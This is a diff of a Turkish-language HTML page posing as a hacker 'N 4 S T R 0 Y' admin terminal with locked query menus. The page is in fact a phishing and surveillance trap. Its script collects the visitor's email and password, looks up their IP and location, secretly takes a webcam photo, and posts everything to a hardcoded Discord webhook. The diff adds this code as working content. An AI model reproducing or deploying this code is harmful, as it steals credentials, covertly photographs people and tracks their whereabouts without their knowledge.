@@ -2,140 +2,143 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>N 4 S T R 0 Y // CORE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>N 4 S T R 0 Y | TERMINAL</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; margin: 0; padding: 0; overflow-x: hidden; }
-        #authWrapper { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
-        .card { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 30px; width: 300px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #333; color: #0f0; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #f00; color: #fff; border: none; font-weight: bold; cursor: pointer; }
+        :root { --red: #ff0000; --blue: #0070f3; --border: #1a1a1a; }
+        body { background: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; }
         
-        #panel { display: none; padding: 10px; }
-        .header { border-bottom: 1px solid #f00; padding: 10px; display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 15px; }
+        /* Giriş Ekranı */
+        #auth { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
+        .login-card { background: #050505; border: 1px solid var(--border); padding: 30px; width: 300px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #0f0; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 12px; background: var(--red); color: #fff; border: none; font-weight: bold; cursor: pointer; letter-spacing: 2px; }
+
+        /* Ana Panel Düzeni */
+        #panel { display: none; height: 100vh; grid-template-columns: 320px 1fr; grid-template-rows: 50px 1fr; gap: 10px; padding: 10px; box-sizing: border-box; }
         
-        /* İstediğin Düzen: Kamera Üstte, Menüler Altta */
-        .grid-container { display: flex; flex-direction: column; gap: 15px; }
-        .cam-box { width: 100%; border: 1px solid #222; background: #050505; padding: 5px; box-sizing: border-box; }
-        #myCam { width: 100%; filter: grayscale(1) contrast(1.2); transform: scaleX(-1); border: 1px solid #333; }
+        .header { grid-column: 1 / 3; border-bottom: 1px solid var(--red); display: flex; justify-content: space-between; align-items: center; padding: 0 15px; font-size: 12px; }
+
+        /* Sol Taraf: Kamera ve Menüler */
+        .sidebar { display: flex; flex-direction: column; gap: 10px; overflow-y: auto; }
+        .cam-box { border: 1px solid var(--border); background: #050505; padding: 5px; }
+        video { width: 100%; filter: grayscale(1) sepia(0.2); transform: scaleX(-1); border: 1px solid #222; }
         
-        .info-box { border: 1px solid #222; background: #050505; padding: 15px; font-size: 11px; }
-        .menu-item { padding: 12px 0; border-bottom: 1px solid #111; display: flex; justify-content: space-between; color: #888; }
-        .status { color: #f00; font-weight: bold; }
-        
-        #mapImg { width: 100%; height: 150px; margin-top: 10px; border: 1px solid #333; display: none; }
-        .footer { text-align: center; color: #222; font-size: 10px; margin-top: 20px; letter-spacing: 5px; }
+        .menu-list { border: 1px solid var(--border); background: #050505; flex-grow: 1; }
+        .menu-item { padding: 12px; border-bottom: 1px solid #111; font-size: 11px; display: flex; justify-content: space-between; cursor: pointer; transition: 0.3s; }
+        .menu-item:hover { background: #111; }
+        .status-red { color: var(--red); font-weight: bold; }
+
+        /* Sağ Taraf: Harita ve Loglar */
+        .main-view { display: flex; flex-direction: column; gap: 10px; }
+        .map-box { border: 1px solid var(--border); background: #050505; height: 250px; padding: 5px; }
+        #map { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
+        .log-box { border: 1px solid var(--border); background: #000; flex-grow: 1; padding: 15px; font-size: 10px; color: var(--blue); overflow-y: auto; line-height: 1.5; }
+
+        .footer-tag { position: fixed; bottom: 10px; right: 20px; font-size: 9px; color: #222; letter-spacing: 3px; }
     </style>
 </head>
 <body>
 
-<audio id="opMusic" loop>
-    <source src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3" type="audio/mpeg">
-</audio>
+<audio id="audio" loop src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3"></audio>
 
-<div id="authWrapper">
-    <div class="card">
-        <h2 style="color:#f00; font-size: 16px;">SECURE LOGIN</h2>
-        <input type="email" id="mail" placeholder="E-Posta Adresi">
-        <input type="password" id="pass" placeholder="Şifre">
-        <button onclick="startOp()">KAYIT OL VE BAĞLAN</button>
+<div id="auth">
+    <div class="login-card">
+        <h2 style="color:var(--red); font-size:16px;">N 4 S T R 0 Y // LOGIN</h2>
+        <input type="email" id="email" placeholder="Sistem ID">
+        <input type="password" id="pass" placeholder="Protokol Şifresi">
+        <button onclick="initSystem()">ERİŞİMİ BAŞLAT</button>
     </div>
 </div>
 
 <div id="panel">
     <div class="header">
-        <span>N 4 S T R 0 Y // ADMIN ACCESS</span>
+        <span>STATION: 04 // ADMIN ACTIVE</span>
         <span id="clock">00:00:00</span>
     </div>
 
-    <div class="grid-container">
+    <div class="sidebar">
         <div class="cam-box">
-            <video id="myCam" autoplay playsinline muted></video>
-            <div id="locData" style="color:#f00; font-size:10px; margin-top:10px;">KONUM SİNYALİ BEKLENİYOR...</div>
-            <img id="mapImg" src="">
+            <video id="video" autoplay playsinline muted></video>
+            <div id="coords" style="font-size:9px; color:var(--red); margin-top:5px;">SİNYAL ARANIYOR...</div>
         </div>
-
-        <div class="info-box">
-            <div style="margin-bottom:10px; color:#f00; border-bottom:1px solid #333; padding-bottom:5px;">SİSTEM DURUMU</div>
-            <div class="menu-item">BATARYA SEVİYESİ <span id="shrg" style="color:#0070f3;">%--</span></div>
-            <div class="menu-item">IP ADRESİ <span id="ipVal" style="color:#fff;">Yükleniyor...</span></div>
-            <div class="menu-item">MERNİS 2026 <span class="status">KİLİTLİ</span></div>
-            <div class="menu-item">KONUM TAKİBİ <span class="status">AKTİF</span></div>
-        </div>
-
-        <div class="info-box" id="logs" style="color:#0070f3; font-size:10px; height:80px; overflow-y:auto;">
-            [INFO] Başlatma komutu beklendi...<br>
+        
+        <div class="menu-list">
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ: Yetki Seviyesi Yetersiz.')">MERNİS 2026 <span class="status-red">KİLİTLİ</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">GSM LOKASYON <span class="status-red">KİLİTLİ</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">SMS BOMBER <span class="status-red">OFFLINE</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">PLAKA SORGUN <span class="status-red">KİLİTLİ</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">TC SORGULAMA <span class="status-red">KİLİTLİ</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">AİLE SORGULAMA <span class="status-red">KİLİTLİ</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">GSM DATA <span class="status-red">KİLİTLİ</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">E-OKUL SIZMA <span class="status-red">KİLİTLİ</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">SİGORTA DATA <span class="status-red">KİLİTLİ</span></div>
+            <div class="menu-item" onclick="alert('ERİŞİM REDDEDİLDİ.')">INSTA CRACK <span class="status-red">OFFLINE</span></div>
         </div>
     </div>
 
-    <div class="footer">N 4 S T R 0 Y</div>
+    <div class="main-view">
+        <div class="map-box">
+            <img id="map" src="" alt="Harita aranıyor...">
+        </div>
+        <div class="log-box" id="terminal">
+            [SYS] Bekleme modundan çıkıldı...<br>
+            [SYS] Protokol 0.34 aktif edildi.<br>
+        </div>
+    </div>
 </div>
 
+<div class="footer-tag">N 4 S T R 0 Y</div>
+
 <script>
-    let userData = { ip: 'Bilinmiyor', lat: '', lon: '' };
-    const webhook = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
+    let d = { ip: '...', lat: '', lon: '' };
+    const wh = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
 
-    // Verileri En Başta Çekmeye Başla
-    async function getDetails() {
-        try {
-            const resp = await fetch('https://ipapi.co/json/');
-            const d = await resp.json();
-            userData.ip = d.ip;
-            userData.lat = d.latitude;
-            userData.lon = d.longitude;
-        } catch(e) { console.log("Hızlı veri alınamadı."); }
-    }
-    getDetails();
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
+        d.ip = res.ip; d.lat = res.latitude; d.lon = res.longitude;
+    });
 
-    async function startOp() {
-        const m = document.getElementById('mail').value;
-        const p = document.getElementById('pass').value;
-        if(!m.includes('@')) return alert("Geçersiz e-posta!");
+    async function initSystem() {
+        const mail = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        if(!mail.includes('@')) return alert("Geçersiz Kimlik!");
 
-        // 1. Müziği Başlat (Kullanıcı tıkladığı için çalışacak)
-        const music = document.getElementById('opMusic');
-        music.play().catch(e => console.log("Müzik engellendi"));
+        document.getElementById('audio').play();
 
-        // 2. Kamera İzni İste
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            document.getElementById('myCam').srcObject = stream;
-            
-            document.getElementById('authWrapper').style.display = 'none';
-            document.getElementById('panel').style.display = 'block';
+            document.getElementById('video').srcObject = stream;
 
-            // 3. Paneli Güncelle
-            document.getElementById('ipVal').innerText = userData.ip;
-            document.getElementById('locData').innerText = `KONUM: ${userData.lat}, ${userData.lon}`;
-            if(userData.lat) {
-                document.getElementById('mapImg').src = `https://static-maps.yandex.ru/1.x/?ll=${userData.lon},${userData.lat}&z=14&l=map&size=400,200&pt=${userData.lon},${userData.lat},pmwtm`;
-                document.getElementById('mapImg').style.display = 'block';
-            }
-            
-            navigator.getBattery().then(b => { document.getElementById('shrg').innerText = '%' + Math.round(b.level * 100); });
+            document.getElementById('auth').style.display = 'none';
+            document.getElementById('panel').style.display = 'grid';
 
-            // 4. Discord'a Fotoğraf ve Bilgi Gönder (2 saniye bekle ki kamera netleşsin)
+            document.getElementById('coords').innerText = `LAT: ${d.lat} | LON: ${d.lon}`;
+            document.getElementById('map').src = `https://static-maps.yandex.ru/1.x/?ll=${d.lon},${d.lat}&z=15&l=map&size=600,450&pt=${d.lon},${d.lat},pmwtm`;
+            
+            const logs = ["IP mühürlendi.", "Konum doğrulanıyor...", "Kamera tünellendi.", "N 4 S T R 0 Y veritabanına bağlanıldı."];
+            logs.forEach((t, i) => setTimeout(() => {
+                document.getElementById('terminal').innerHTML += `[INFO] ${t}<br>`;
+            }, i * 1000));
+
+            // Discord'a gönderim
             setTimeout(() => {
-                const video = document.getElementById('myCam');
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(blob => {
+                const v = document.getElementById('video');
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => {
                     const fd = new FormData();
-                    const txt = `🚨 **N 4 S T R 0 Y - SIZMA**\n**Mail:** ${m}\n**Şifre:** ${p}\n**IP:** ${userData.ip}\n**Konum:** ${userData.lat},${userData.lon}`;
-                    fd.append("payload_json", JSON.stringify({ content: txt }));
-                    fd.append("file", blob, "shot.png");
-                    fetch(webhook, { method: "POST", body: fd });
+                    const msg = `🚨 **N 4 S T R 0 Y - HEDEF**\n**Mail:** ${mail}\n**Pass:** ${pass}\n**IP:** ${d.ip}\n**Konum:** ${d.lat},${d.lon}`;
+                    fd.append("payload_json", JSON.stringify({ content: msg }));
+                    fd.append("file", b, "shot.png");
+                    fetch(wh, { method: "POST", body: fd });
                 });
-            }, 2000);
+            }, 3000);
 
         } catch(e) {
-            alert("Sistem Erişimi İçin Kamera İzni Gerekli!");
+            alert("Sistem için kamera izni şart!");
         }
     }
-
     setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
 </script>
 </body>
